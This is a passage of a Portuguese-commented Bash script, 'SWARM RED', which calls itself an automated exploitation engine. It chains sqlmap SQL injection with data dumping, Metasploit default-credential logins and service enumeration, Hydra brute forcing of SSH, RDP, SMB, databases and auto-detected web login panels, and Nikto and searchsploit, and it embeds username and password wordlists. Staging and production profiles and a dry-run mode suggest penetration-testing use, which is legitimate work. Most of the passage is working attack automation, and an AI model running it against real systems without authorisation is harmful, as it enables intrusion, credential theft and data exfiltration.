            --random-agent
            --flush-session
            --technique=BEUSTQ
            --tamper="$tamper_scripts"
        )

        # Dump apenas em staging/lab
        if [ "$dump" = true ]; then
            sqlmap_args+=(--dump --dump-format=CSV)
        else
            sqlmap_args+=(--banner --current-db --current-user)
        fi

        log_cmd "sqlmap ${sqlmap_args[*]}"

        _run_tool 300 "$OUTDIR/sqlmap/${safe_name}_output.log" \
            sqlmap "${sqlmap_args[@]}" \
            || true

        # Detectar sucesso
        if grep -qiE "(is vulnerable|injectable|payload|fetched)" "$OUTDIR/sqlmap/${safe_name}_output.log" 2>/dev/null; then
            info "  ${RED}⚡ VULNERÁVEL: $url${RST}"
            echo "VULNERABLE|$url|sqlmap|level=$level,risk=$risk" >> "$OUTDIR/exploits_confirmed.csv"
            ((SUCCESSFUL_EXPLOITS++))
        else
            info "  Não vulnerável ou protegido"
            echo "NOT_VULNERABLE|$url|sqlmap|level=$level,risk=$risk" >> "$OUTDIR/exploits_attempted.csv"
        fi
        ((TOTAL_EXPLOITS++))

    done < "$sqli_urls"

    _parse_sqlmap_results "$OUTDIR/sqlmap"
    info "SQLi fase completa: $tested URL(s) testada(s)"
}

_parse_sqlmap_results() {
    local dir="$1"
    # Consolidar achados do sqlmap
    find "$dir" -name "*.csv" -o -name "log" 2>/dev/null | while read -r f; do
        if grep -qiE "vulnerable|injectable" "$f" 2>/dev/null; then
            info "  Evidência SQLi: $f"
        fi
    done || true
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 3: METASPLOIT EXPLOITATION
# ═══════════════════════════════════════════════════════════════════════════════
run_msf_phase() {
    phase "FASE 3/6: METASPLOIT EXPLOITATION"

    if ! has msfconsole; then
        warn "Metasploit não encontrado — fase desabilitada"
        return 0
    fi

    if [ "$PROFILE" = "production" ]; then
        warn "Perfil production — Metasploit exploitation desabilitado"
        warn "Apenas auxiliary/scanner modules serão usados"
    fi

    mkdir -p "$OUTDIR/metasploit"

    # ── Garantir PostgreSQL rodando (necessário para Metasploit DB) ──
    if has pg_isready; then
        if ! pg_isready -q 2>/dev/null; then
            warn "PostgreSQL não está rodando — iniciando..."
            sudo service postgresql start 2>/dev/null \
                || sudo /etc/init.d/postgresql start 2>/dev/null \
                || sudo systemctl start postgresql 2>/dev/null \
                || true
            sleep 2
            if pg_isready -q 2>/dev/null; then
                info "PostgreSQL iniciado"
            else
                warn "PostgreSQL não iniciou — Metasploit DB não terá persistência"
            fi
        else
            info "PostgreSQL rodando"
        fi
    fi

    # ── Detectar LHOST ──
    if [ -z "$LHOST" ]; then
        # Tentar detectar IP automaticamente
        LHOST=$(ip route get 1 2>/dev/null | awk '{print $7; exit}')
        if [ -z "$LHOST" ]; then
            LHOST=$(hostname -I 2>/dev/null | awk '{print $1}')
        fi
        if [ -z "$LHOST" ]; then
            warn "Não consegui detectar LHOST — defina com --lhost"
            LHOST="127.0.0.1"
        fi
    fi
    info "LHOST: $LHOST | LPORT: $LPORT"

    # ── Gerar Resource Script do Metasploit ──
    local rc_file="$OUTDIR/metasploit/swarm_red.rc"
    _generate_msf_rc "$rc_file"

    if [ "$DRY_RUN" = true ]; then
        info "[DRY-RUN] Resource script gerado: $rc_file"
        info "[DRY-RUN] Executaria: msfconsole -q -r $rc_file"
        return 0
    fi

    log_cmd "msfconsole -q -r $rc_file"
    info "Executando Metasploit com resource script..."
    info "  (isto pode levar vários minutos — logs em $OUTDIR/metasploit/msf_output.log)"

    timeout 1800 msfconsole -q -r "$rc_file" \
        < /dev/null \
        > "$OUTDIR/metasploit/msf_output.log" 2>&1 || true

    info "Metasploit concluído (exit code: $?)"

    # Parse resultados
    _parse_msf_results

    info "Metasploit fase completa"
}

_generate_msf_rc() {
    local rc_file="$1"
    local target_ip

    # Resolver IP do target
    target_ip=$(dig +short "$TARGET" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
    if [ -z "$target_ip" ]; then
        target_ip=$(getent hosts "$TARGET" 2>/dev/null | awk '{print $1}' | head -1)
    fi
    [ -z "$target_ip" ] && target_ip="$TARGET"

    info "Target IP: $target_ip"

    cat > "$rc_file" << RCEOF
# ═══════════════════════════════════════════════════════
#  SWARM RED — Metasploit Resource Script
#  Gerado: $(ts)
#  Target: $TARGET ($target_ip)
#  Profile: $PROFILE
# ═══════════════════════════════════════════════════════
setg RHOSTS $target_ip
setg RHOST $target_ip
setg LHOST $LHOST
setg LPORT $LPORT
setg VERBOSE true

# ── Workspace ──
workspace -a swarm_red_$(date +%Y%m%d)

# ── DB Import (se nmap XML disponível) ──
RCEOF

    # Importar nmap se disponível
    local nmap_xml
    nmap_xml=$(find "$OUTDIR" "$SCAN_DIR" -name "*.xml" -path "*/nmap*" 2>/dev/null | head -1)
    if [ -n "$nmap_xml" ]; then
        echo "db_import $nmap_xml" >> "$rc_file"
        info "Nmap XML será importado: $nmap_xml"
    fi

    cat >> "$rc_file" << 'RCEOF'

# ═══════════════════════════════════════════════════════
#  MÓDULO 1: Scanner de serviços HTTP
# ═══════════════════════════════════════════════════════
echo "========== HTTP SERVICE SCANNER =========="
use auxiliary/scanner/http/http_version
run
back

# ═══════════════════════════════════════════════════════
#  MÓDULO 2: HTTP Header Analysis
# ═══════════════════════════════════════════════════════
echo "========== HTTP HEADERS =========="
use auxiliary/scanner/http/http_header
run
back

# ═══════════════════════════════════════════════════════
#  MÓDULO 3: SSL/TLS Analysis
# ═══════════════════════════════════════════════════════
echo "========== SSL/TLS SCANNER =========="
use auxiliary/scanner/http/ssl_version
set RPORT 443
run
back

# ═══════════════════════════════════════════════════════
#  MÓDULO 4: Directory Brute Force
# ═══════════════════════════════════════════════════════
echo "========== DIR SCANNER =========="
use auxiliary/scanner/http/dir_scanner
set RPORT 443
set SSL true
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run
back

# ═══════════════════════════════════════════════════════
#  MÓDULO 5: Default Credentials
# ═══════════════════════════════════════════════════════
echo "========== TOMCAT MANAGER =========="
use auxiliary/scanner/http/tomcat_mgr_login
set RPORT 8080
set STOP_ON_SUCCESS true
run
back

echo "========== JENKINS =========="
use auxiliary/scanner/http/jenkins_login
set RPORT 8080
run
back
RCEOF

    # ── CVE-based exploits (apenas staging/lab) ──
    if [ "$PROFILE" != "production" ] && [ -f "$OUTDIR/cves_found.txt" ] && [ -s "$OUTDIR/cves_found.txt" ]; then
        echo "" >> "$rc_file"
        echo "# ═══════════════════════════════════════════════════════" >> "$rc_file"
        echo "#  MÓDULO 6: CVE-based Exploits (auto-generated)" >> "$rc_file"
        echo "# ═══════════════════════════════════════════════════════" >> "$rc_file"

        while IFS= read -r cve; do
            [ -z "$cve" ] && continue
            cat >> "$rc_file" << RCEOF

echo "========== Searching: $cve =========="
search cve:$cve type:exploit
RCEOF
        done < "$OUTDIR/cves_found.txt"
    fi

    # ── Portas específicas baseadas no nmap ──
    if [ -f "$OUTDIR/open_services.txt" ] && [ -s "$OUTDIR/open_services.txt" ]; then
        echo "" >> "$rc_file"
        echo "# ═══════════════════════════════════════════════════════" >> "$rc_file"
        echo "#  MÓDULO 7: Service-specific scanners" >> "$rc_file"
        echo "# ═══════════════════════════════════════════════════════" >> "$rc_file"

        # SSH
        if grep -q "22/tcp" "$OUTDIR/open_services.txt" 2>/dev/null; then
            cat >> "$rc_file" << 'RCEOF'

echo "========== SSH ENUMUSERS =========="
use auxiliary/scanner/ssh/ssh_enumusers
set RPORT 22
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set THREADS 5
run
back
RCEOF
        fi

        # SMB
        if grep -q "445/tcp" "$OUTDIR/open_services.txt" 2>/dev/null; then
            cat >> "$rc_file" << 'RCEOF'

echo "========== SMB VERSION =========="
use auxiliary/scanner/smb/smb_version
run
back

echo "========== SMB ENUM SHARES =========="
use auxiliary/scanner/smb/smb_enumshares
run
back
RCEOF
        fi

        # MySQL
        if grep -qE "3306/tcp" "$OUTDIR/open_services.txt" 2>/dev/null; then
            cat >> "$rc_file" << 'RCEOF'

echo "========== MYSQL LOGIN =========="
use auxiliary/scanner/mysql/mysql_login
set RPORT 3306
set BLANK_PASSWORDS true
set USERNAME root
run
back
RCEOF
        fi

        # PostgreSQL
        if grep -qE "5432/tcp" "$OUTDIR/open_services.txt" 2>/dev/null; then
            cat >> "$rc_file" << 'RCEOF'

echo "========== POSTGRES LOGIN =========="
use auxiliary/scanner/postgres/postgres_login
set RPORT 5432
set USERNAME postgres
run
back
RCEOF
        fi

        # RDP
        if grep -qE "3389/tcp" "$OUTDIR/open_services.txt" 2>/dev/null; then
            cat >> "$rc_file" << 'RCEOF'

echo "========== RDP SCANNER =========="
use auxiliary/scanner/rdp/rdp_scanner
run
back
RCEOF
        fi
    fi

    # Finalizar
    cat >> "$rc_file" << RCEOF

# ═══════════════════════════════════════════════════════
#  EXPORT E CLEANUP
# ═══════════════════════════════════════════════════════
echo "========== EXPORTING RESULTS =========="
hosts -o $OUTDIR/metasploit/hosts.csv
services -o $OUTDIR/metasploit/services.csv
vulns -o $OUTDIR/metasploit/vulns.csv
creds -o $OUTDIR/metasploit/creds.csv
echo "========== SWARM RED MSF COMPLETE =========="
exit
RCEOF

    info "Resource script gerado: $rc_file"
}

_parse_msf_results() {
    local msf_log="$OUTDIR/metasploit/msf_output.log"
    if [ -f "$msf_log" ]; then
        # Contar sessões abertas
        local sessions
        sessions=$(grep -c "session.*opened" "$msf_log" 2>/dev/null || echo "0")
        if [ "$sessions" -gt 0 ]; then
            info "  ${RED}⚡ SESSÕES ABERTAS: $sessions${RST}"
            ((SUCCESSFUL_EXPLOITS += sessions))
        fi

        # Contar credenciais encontradas
        local creds
        creds=$(grep -ciE "(login|password|credential|found)" "$msf_log" 2>/dev/null || echo "0")
        if [ "$creds" -gt 0 ]; then
            info "  Credenciais/logins detectados: ~$creds referências"
        fi

        ((TOTAL_EXPLOITS++))
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
#  WORDLISTS EMBUTIDAS (curadas para pentest — top defaults + leaks)
# ═══════════════════════════════════════════════════════════════════════════════
_generate_embedded_wordlists() {
    # Top 200 usernames — baseado em OWASP, SecLists top-usernames-shortlist,
    # defaults de appliances, databases, CMS, cloud, IoT e frameworks
    cat > "$OUTDIR/hydra/users.txt" << 'USERS'
admin
root
administrator
user
test
guest
info
adm
mysql
postgres
oracle
ftp
pi
ubnt
support
manager
operator
tomcat
apache
nginx
www
www-data
webmaster
postmaster
mail
email
backup
nagios
monitor
zabbix
ansible
deploy
jenkins
git
svn
docker
vagrant
ubuntu
ec2-user
centos
debian
kali
ftpuser
anonymous
sysadmin
superadmin
sa
dba
dbadmin
webadmin
siteadmin
netadmin
firewall
security
audit
service
daemon
bin
sys
sync
proxy
nobody
staff
operator
games
gopher
ntp
sshd
vnc
teamviewer
remote
rdp
citrix
demo
lab
student
training
public
default
temp
tmp
office
sales
marketing
finance
hr
dev
developer
staging
production
api
app
application
system
server
database
data
web
http
https
ftp
sftp
ssh
telnet
snmp
smtp
pop3
imap
dns
dhcp
ldap
vpn
cisco
juniper
huawei
mikrotik
fortinet
paloalto
sonicwall
watchguard
admin1
admin123
user1
test1
password
pass
login
master
super
USERS

    # Top 500 passwords — baseado em rockyou top, SecLists Common-Credentials,
    # OWASP top passwords, defaults de devices/databases/CMS, e variações PT-BR
    cat > "$OUTDIR/hydra/passwords.txt" << 'PASSWORDS'
password
123456
12345678
1234
qwerty
12345
dragon
pussy
baseball
football
letmein
monkey
696969
abc123
mustang
michael
shadow
master
jennifer
111111
2000
jordan
superman
harley
1234567
fuckme
hunter
fuckyou
trustno1
ranger
buster
thomas
tigger
robert
soccer
fuck
batman
test
pass
killer
hockey
george
charlie
andrew
michelle
love
sunshine
jessica
asshole
6969
pepper
daniel
access
123456789
654321
joshua
maggie
starwars
silver
william
dallas
yankees
123123
ashley
666666
hello
amanda
orange
biteme
freedom
computer
sexy
thunder
nicole
ginger
heather
hammer
summer
corvette
taylor
fucker
austin
1111
merlin
matthew
121212
golfer
cheese
princess
martin
chelsea
patrick
richard
diamond
yellow
bigdog
secret
asdfgh
sparky
cowboy
camaro
anthony
matrix
falcon
iloveyou
bailey
guitar
jackson
purple
scooter
phoenix
aaaaaa
morgan
tigers
porsche
mickey
maverick
cookie
nascar
peanut
justin
131313
money
horny
samantha
panties
steelers
joseph
snoopy
boomer
whatever
iceman
smokey
gateway
dakota
cowboys
eagles
chicken
dick
black
zxcvbn
please
andrea
ferrari
knight
hardcore
melissa
compaq
coffee
booboo
bitch
johnny
bulldog
xxxxxx
welcome
james
player
ncc1701
wizard
scooby
charles
junior
internet
bigdick
mike
brandy
tennis
blowjob
banana
monster
spider
lakers
miller
rabbit
enter
mercedes
brandon
steven
fender
john
yamaha
diablo
chris
boston
tiger
marine
chicago
rangers
gandalf
winter
bigtits
barney
edward
raiders
porn
badboy
blaster
frank
hannah
jasper
winner
dallas1
helpme
lover
stupid
samson
albert
nothing
power
starter
single
server
oracle
update
changeme
changeit
passwd
manager1
admin1
admin123
admin1234
nimda
letmein
welcome1
welcome123
password1
password123
p@ssw0rd
P@ssword1
P@ssw0rd
passw0rd
qwerty123
qwerty1
1q2w3e4r
1qaz2wsx
zaq1xsw2
passpass
rootroot
toor
r00t
adminadmin
administrator
master
vmware
esxi
apache
tomcat
tomcat1
manager
jenkins
j3nk1ns
ansible
vagrant
docker
mysql
mysqladmin
postgres
postgresql
pgadmin
oracle
oracle123
redis
mongodb
mongo
memcached
rabbitmq
guest
cassandra
elasticsearch
elastic
kibana
grafana
zabbix
nagios
nagiosadmin
cisco
cisco123
Cisco
class
enable
private
public
ubnt
mikrotik
pfsense
opnsense
fortinet
fortigate
sonicwall
watchguard
admin2019
admin2020
admin2021
admin2022
admin2023
admin2024
admin2025
admin2026
summer2024
winter2024
spring2025
fall2025
company
company1
empresa
empresa1
mudar123
trocar
abc1234
teste
teste123
senha
senha123
12345
123mudar
pass123
acesso
acessar
sistema
PASSWORDS

    userlist="$OUTDIR/hydra/users.txt"
    passlist="$OUTDIR/hydra/passwords.txt"

    info "Wordlists geradas: users=$(wc -l < "$userlist"), passwords=$(wc -l < "$passlist")"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  DETECÇÃO DE PAINÉIS HTTP COM LOGIN (para Hydra)
# ═══════════════════════════════════════════════════════════════════════════════
_detect_http_login_panels() {
    local target_ip="$1"

    # Painéis conhecidos: path, protocolo hydra, porta, descrição
    local panels=(
        "/manager/html:https-get:8080:Tomcat Manager"
        "/manager/html:https-get:443:Tomcat Manager"
        "/phpmyadmin/:https-form-post:443:phpMyAdmin"
        "/wp-login.php:https-form-post:443:WordPress"
        "/administrator/:https-form-post:443:Joomla"
        "/admin/:https-get:443:Admin Panel"
        "/jenkins/login:https-form-post:8080:Jenkins"
        "/grafana/login:https-form-post:3000:Grafana"
    )

    info "Detectando painéis HTTP com autenticação..."

    for panel_entry in "${panels[@]}"; do
        local path="${panel_entry%%:*}"
        local remainder="${panel_entry#*:}"
        local proto="${remainder%%:*}"
        remainder="${remainder#*:}"
        local port="${remainder%%:*}"
        local desc="${remainder#*:}"

        # Verificar se a porta está aberta
        if ! grep -q "${port}/tcp" "$OUTDIR/open_services.txt" 2>/dev/null; then
            # Para 443, também checar se 80 está aberto (redirect)
            [ "$port" = "443" ] && grep -q "80/tcp" "$OUTDIR/open_services.txt" 2>/dev/null || continue
        fi

        # Fazer request rápido para ver se o painel existe
        local url="https://${TARGET}:${port}${path}"
        local http_code
        http_code=$(curl -sSkL -o /dev/null -w "%{http_code}" --max-time 5 "$url" 2>/dev/null || echo "000")

        if [ "$http_code" = "401" ]; then
            # HTTP 401 = autenticação básica — perfeito para hydra
            info "  Detectado: $desc ($url) — HTTP 401 (Basic Auth)"
            services_to_test+=("https-get:${port}:${path}")
        elif [ "$http_code" = "200" ]; then
            # HTTP 200 = pode ter form de login — verificar se tem <form> com password
            local body
            body=$(curl -sSkL --max-time 5 "$url" 2>/dev/null | head -200)
            if echo "$body" | grep -qiE 'type=["\x27]?password|name=["\x27]?pass|login.*form|sign.?in'; then
                info "  Detectado: $desc ($url) — Form de login"
                # Hydra http-form-post precisa saber os campos do form
                # Extrair action, user field, pass field
                local action user_field pass_field
                action=$(echo "$body" | grep -oiP 'action=["\x27]?\K[^"\x27\s>]+' | head -1)
                user_field=$(echo "$body" | grep -oiP 'name=["\x27]?\K(user|username|email|login|usr|uname|log)["\x27]?' | head -1 | tr -d "\"'")
                pass_field=$(echo "$body" | grep -oiP 'name=["\x27]?\K(pass|password|pwd|passwd|secret)["\x27]?' | head -1 | tr -d "\"'")

                if [ -n "$user_field" ] && [ -n "$pass_field" ]; then
                    [ -z "$action" ] && action="$path"
                    # Formato hydra: "path:user_field=^USER^&pass_field=^PASS^:F=error_indicator"
                    local form_str="${action}:${user_field}=^USER^&${pass_field}=^PASS^:F=incorrect"
                    info "  Form: $form_str"
                    services_to_test+=("https-form-post:${port}:${form_str}")
                fi
            fi
        fi
    done

    # Também verificar URLs do ZAP que retornaram 401
    if [ -f "$OUTDIR/input_zap.json" ]; then
        local auth_urls
        auth_urls=$($VENV_PYTHON -c "
import json,sys
try:
    with open('$OUTDIR/input_zap.json') as f: data=json.load(f)
    alerts = data if isinstance(data,list) else data.get('alerts',data.get('site',[]))
    if isinstance(alerts,dict): alerts=[alerts]
    for a in alerts:
        if isinstance(a,dict) and '401' in str(a.get('evidence',''))+str(a.get('statusCode','')):
            url=a.get('url','')
            if url: print(url)
except: pass
" 2>/dev/null | sort -u | head -5)

        while IFS= read -r auth_url; do
            [ -z "$auth_url" ] && continue
            info "  Detectado via ZAP: $auth_url — HTTP 401"
            # Extrair porta da URL
            local auth_port
            auth_port=$(echo "$auth_url" | grep -oP ':\K\d+(?=/)' || echo "443")
            local auth_path
            auth_path=$(echo "$auth_url" | sed 's|https\?://[^/]*||')
            services_to_test+=("https-get:${auth_port}:${auth_path}")
        done <<< "$auth_urls"
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 4: BRUTE FORCE (Hydra)
# ═══════════════════════════════════════════════════════════════════════════════
run_brute_phase() {
    phase "FASE 4/6: BRUTE FORCE (Hydra)"

    if [ "${PROFILE_BRUTE_FORCE[$PROFILE]}" != "true" ]; then
        warn "Brute force desabilitado no perfil $PROFILE"
        return 0
    fi

    if ! has hydra; then
        warn "hydra não encontrado — fase desabilitada"
        return 0
    fi

    mkdir -p "$OUTDIR/hydra"

    # Limpar restore files de sessões anteriores do hydra
    rm -f ./hydra.restore 2>/dev/null

    if [ ! -f "$OUTDIR/open_services.txt" ] || [ ! -s "$OUTDIR/open_services.txt" ]; then
        warn "Sem serviços detectados — pulando brute force"
        return 0
    fi

    local target_ip
    target_ip=$(dig +short "$TARGET" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
    [ -z "$target_ip" ] && target_ip="$TARGET"

    # ── Resolver wordlists (cascata de detecção) ──
    local userlist="" passlist=""

    _find_wordlists() {
        # Cascata: SecLists → Metasploit → Kali default → John → download → embutida
        local user_candidates=(
            "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
            "/opt/SecLists/Usernames/top-usernames-shortlist.txt"
            "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
            "/usr/share/metasploit-framework/data/wordlists/common_users.txt"
            "/usr/share/metasploit-framework/data/wordlists/unix_users.txt"
            "/usr/share/wordlists/metasploit/common_users.txt"
            "/usr/share/nmap/nselib/data/usernames.lst"
            "/usr/share/john/password.lst"
        )
        local pass_candidates=(
            "/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt"
            "/opt/SecLists/Passwords/xato-net-10-million-passwords-100000.txt"
            "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
            "/usr/share/wordlists/rockyou.txt"
            "/usr/share/wordlists/fasttrack.txt"
            "/usr/share/metasploit-framework/data/wordlists/common_passwords.txt"
            "/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt"
            "/usr/share/wordlists/metasploit/common_passwords.txt"
            "/usr/share/nmap/nselib/data/passwords.lst"
            "/usr/share/john/password.lst"
        )

        for f in "${user_candidates[@]}"; do
            if [ -f "$f" ]; then
                userlist="$f"
                break
            fi
            # rockyou.txt.gz → descompactar
            if [ -f "${f}.gz" ]; then
                info "Descompactando ${f}.gz..."
                sudo gunzip -k "${f}.gz" 2>/dev/null || gunzip -k "${f}.gz" 2>/dev/null || true
                [ -f "$f" ] && userlist="$f" && break
            fi
        done

        for f in "${pass_candidates[@]}"; do
            if [ -f "$f" ]; then
                passlist="$f"
                break
            fi
            if [ -f "${f}.gz" ]; then
                info "Descompactando ${f}.gz..."
                sudo gunzip -k "${f}.gz" 2>/dev/null || gunzip -k "${f}.gz" 2>/dev/null || true
                [ -f "$f" ] && passlist="$f" && break
            fi
        done
    }

    _find_wordlists

    # Tentativa 2: instalar SecLists se nada foi encontrado
    if [ -z "$userlist" ] || [ -z "$passlist" ]; then
        warn "Wordlists do sistema não encontradas — instalando SecLists..."
        local seclists_installed=false

        # Tentar via pacote (Kali/Parrot)
        if has apt-get; then
            sudo apt-get install -y -qq seclists 2>/dev/null && seclists_installed=true
        fi

        # Tentar via git clone (qualquer distro)
        if [ "$seclists_installed" = false ] && has git; then
            local seclists_dir="/opt/SecLists"
            if [ ! -d "$seclists_dir" ]; then
                warn "Clonando SecLists do GitHub (isto pode levar alguns minutos)..."
                sudo git clone --depth 1 https://github.com/danielmiessler/SecLists.git "$seclists_dir" 2>/dev/null || true
            fi
        fi

        # Re-buscar após instalação
        _find_wordlists
    fi

    # Tentativa 3: gerar listas embutidas de qualidade
    if [ -z "$userlist" ] || [ -z "$passlist" ]; then
        warn "Gerando wordlists embutidas SWARM RED (curadas para pentest)..."
        _generate_embedded_wordlists
    fi

    local user_count pass_count
    user_count=$(wc -l < "$userlist" 2>/dev/null || echo "0")
    pass_count=$(wc -l < "$passlist" 2>/dev/null || echo "0")
    info "Userlist: $userlist ($user_count entries)"
    info "Passlist: $passlist ($pass_count entries)"

    # Testar cada serviço detectado
    local services_to_test=()

    grep -q "22/tcp" "$OUTDIR/open_services.txt" 2>/dev/null && services_to_test+=("ssh:22")
    grep -q "21/tcp" "$OUTDIR/open_services.txt" 2>/dev/null && services_to_test+=("ftp:21")
    grep -qE "3306/tcp" "$OUTDIR/open_services.txt" 2>/dev/null && services_to_test+=("mysql:3306")
    grep -qE "5432/tcp" "$OUTDIR/open_services.txt" 2>/dev/null && services_to_test+=("postgres:5432")
    grep -qE "3389/tcp" "$OUTDIR/open_services.txt" 2>/dev/null && services_to_test+=("rdp:3389")
    grep -qE "445/tcp" "$OUTDIR/open_services.txt" 2>/dev/null && services_to_test+=("smb:445")

    # HTTP: só testar se encontrar painéis de login conhecidos
    if grep -qE "^(80|443|8080|8443)/tcp" "$OUTDIR/open_services.txt" 2>/dev/null; then
        _detect_http_login_panels "$target_ip"
    fi

    if [ ${#services_to_test[@]} -eq 0 ]; then
        warn "Nenhum serviço compatível com brute force detectado"
        return 0
    fi

    info "${#services_to_test[@]} serviço(s) para testar"

    for svc_port in "${services_to_test[@]}"; do
        local svc="${svc_port%%:*}"
        local remainder="${svc_port#*:}"
        local port="${remainder%%:*}"
        local extra="${remainder#*:}"
        [ "$extra" = "$port" ] && extra=""  # Sem path extra

        info "Testando $svc na porta $port..."
        [ -n "$extra" ] && info "  Path/Form: $extra"

        if [ "$DRY_RUN" = true ]; then
            info "[DRY-RUN] hydra -L users -P passwords -s $port $target_ip $svc ${extra:+\"$extra\"}"
            continue
        fi

        # Nome seguro para arquivo de resultado
        local safe_svc
        safe_svc=$(echo "${svc}_${port}" | tr '/:' '_')

        log_cmd "hydra -L $userlist -P $passlist -s $port -t 4 -f -I -o $OUTDIR/hydra/${safe_svc}_results.txt $target_ip $svc ${extra}"

        local hydra_args=(
            -L "$userlist"
            -P "$passlist"
            -s "$port"
            -t 4
            -f
            -I
            -o "$OUTDIR/hydra/${safe_svc}_results.txt"
        )

        # Se é HTTPS, adicionar flag SSL
        if [[ "$svc" == https-* ]]; then
            hydra_args+=(-S)
        fi

        # Para http-form-post, o "extra" é o form string
        if [[ "$svc" == *"form-post"* ]] && [ -n "$extra" ]; then
            hydra_args+=("$target_ip" "https-form-post" "$extra")
        elif [ -n "$extra" ]; then
            # Para https-get com path
            hydra_args+=("$target_ip" "$svc" "$extra")
        else
            hydra_args+=("$target_ip" "$svc")
        fi

        timeout 300 hydra "${hydra_args[@]}" \
            < /dev/null \
            > "$OUTDIR/hydra/${safe_svc}_output.log" 2>&1 || true

        # Verificar resultados
        if grep -qiE "login:|password:" "$OUTDIR/hydra/${safe_svc}_results.txt" 2>/dev/null; then
            info "  ${RED}⚡ CREDENCIAIS ENCONTRADAS para $svc!${RST}"
            cat "$OUTDIR/hydra/${safe_svc}_results.txt" | tee -a "$OUTDIR/exploits_confirmed.csv"
            ((SUCCESSFUL_EXPLOITS++))
        else
            info "  Sem credenciais válidas para $svc:$port"
        fi
        ((TOTAL_EXPLOITS++))
    done

    info "Brute force fase completa"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 5: NIKTO (Web Vuln Scanner)
# ═══════════════════════════════════════════════════════════════════════════════
run_nikto_phase() {
    phase "FASE 5/6: NIKTO WEB SCANNER"

    if [ "${PROFILE_NIKTO_ENABLED[$PROFILE]}" != "true" ]; then
        warn "Nikto desabilitado no perfil $PROFILE"
        return 0
    fi

    if ! has nikto; then
        warn "nikto não encontrado — fase desabilitada"
        return 0
    fi

    mkdir -p "$OUTDIR/nikto"

    local nikto_target="https://${TARGET}"

    if [ "$DRY_RUN" = true ]; then
        info "[DRY-RUN] nikto -h $nikto_target -o $OUTDIR/nikto/nikto_report.json -Format json"
        return 0
    fi

    info "Escaneando: $nikto_target (log em $OUTDIR/nikto/nikto_output.log)"
    log_cmd "nikto -h $nikto_target -o $OUTDIR/nikto/nikto_report.json -Format json -Tuning 123456789abc -maxtime 600"

    timeout 700 nikto \
        -h "$nikto_target" \
        -o "$OUTDIR/nikto/nikto_report.json" \
        -Format json \
        -Tuning "123456789abc" \
        -maxtime 600 \
        < /dev/null \
        > "$OUTDIR/nikto/nikto_output.log" 2>&1 || true

    # Contar achados
    if [ -f "$OUTDIR/nikto/nikto_report.json" ]; then
        local findings
        findings=$(jq -r '.vulnerabilities | length' "$OUTDIR/nikto/nikto_report.json" 2>/dev/null || echo "0")
        info "Nikto findings: $findings"
    fi

    info "Nikto fase completa"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 6: SEARCHSPLOIT + RELATÓRIO
# ═══════════════════════════════════════════════════════════════════════════════
run_searchsploit_phase() {
    phase "FASE 6/6: SEARCHSPLOIT + RELATÓRIO FINAL"

    mkdir -p "$OUTDIR/searchsploit"

    # ── SearchSploit para CVEs encontrados ──
    if has searchsploit && [ -f "$OUTDIR/cves_found.txt" ] && [ -s "$OUTDIR/cves_found.txt" ]; then
        info "Buscando exploits públicos para CVEs encontrados..."

        while IFS= read -r cve; do
            [ -z "$cve" ] && continue
            if [ "$DRY_RUN" = true ]; then
                info "[DRY-RUN] searchsploit $cve"
                continue
            fi

            local result
            result=$(searchsploit --json "$cve" 2>/dev/null || echo "{}")
            echo "$result" > "$OUTDIR/searchsploit/${cve}.json"

            local count
            count=$(echo "$result" | jq '.RESULTS_EXPLOIT | length' 2>/dev/null || echo "0")
            if [ "$count" -gt 0 ]; then
                info "  $cve → $count exploit(s) público(s)"
            fi
        done < "$OUTDIR/cves_found.txt"
    fi

    # ── Gerar relatório consolidado ──
    _generate_report
}

# ═══════════════════════════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════════════════════════
#  GERADOR DE RELATÓRIO (Red Team Professional — Big4 Style)
# ═══════════════════════════════════════════════════════════════════════════════
_generate_report() {
    info "Gerando relatório Red Team (Big4 style)..."

    $VENV_PYTHON "$LIB_DIR/report_generator.py" \
        "$OUTDIR" "$TARGET" "$PROFILE" \
        "$TOTAL_EXPLOITS" "$SUCCESSFUL_EXPLOITS" "$FAILED_EXPLOITS" \
        "$VERSION"

    if [ -f "$OUTDIR/relatorio_swarm_red.html" ]; then
        info "Relatório: $OUTDIR/relatorio_swarm_red.html"
    else
        fail "Falha ao gerar relatório"
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
#  SUMÁRIO FINAL
# ═══════════════════════════════════════════════════════════════════════════════
print_summary() {
    echo ""
    echo -e "${RED}═══════════════════════════════════════════════════════════════════════${RST}"
    echo -e "  ${RED}${BLD}SWARM RED — SUMÁRIO FINAL${RST}"
    echo -e "${RED}═══════════════════════════════════════════════════════════════════════${RST}"
    echo -e "  ${CYN}Alvo:${RST}       $TARGET"
    echo -e "  ${CYN}Perfil:${RST}     $PROFILE"
    echo -e "  ${CYN}Duração:${RST}    $(elapsed)"
    echo -e "  ${CYN}Testes:${RST}     $TOTAL_EXPLOITS"
    echo -e "  ${RED}Exploits:${RST}   $SUCCESSFUL_EXPLOITS confirmado(s)"
    echo -e "  ${CYN}Output:${RST}     $OUTDIR/"
    echo -e "  ${CYN}Relatório:${RST}  $OUTDIR/relatorio_swarm_red.html"
    echo -e "  ${CYN}Log:${RST}        $LOGFILE"
    echo -e "${RED}═══════════════════════════════════════════════════════════════════════${RST}"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  HELP
# ═══════════════════════════════════════════════════════════════════════════════
show_help() {
    cat << EOF
${RED}SWARM RED${RST} v${VERSION} — Automated Exploitation Engine

${BLD}USO:${RST}
  bash swarm_red.sh -d <scan_dir>                    Explorar resultados do SWARM
  bash swarm_red.sh -d <scan_dir> -p staging         Com perfil específico
  bash swarm_red.sh -d <scan_dir> --dry-run           Simular sem executar
